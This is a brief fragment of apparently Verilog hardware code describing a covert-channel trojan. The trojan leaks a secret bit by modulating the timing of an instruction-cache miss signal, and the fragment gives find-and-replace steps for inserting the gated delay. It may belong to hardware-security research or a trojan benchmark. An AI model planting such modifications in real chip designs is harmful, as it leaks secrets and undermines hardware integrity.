 ...
 * Payload: Modulate timing of icache_miss_valid_i based on secret data
 * 
...
assign secret_bit = icache_miss_valid_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of icache_miss_valid_i
//
// Integration Script Must Modify:
//
// IF icache_miss_valid_i is timing-sensitive:
//   Find: assign icache_miss_valid_i = ready_signal;
//   Replace: assign icache_miss_valid_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
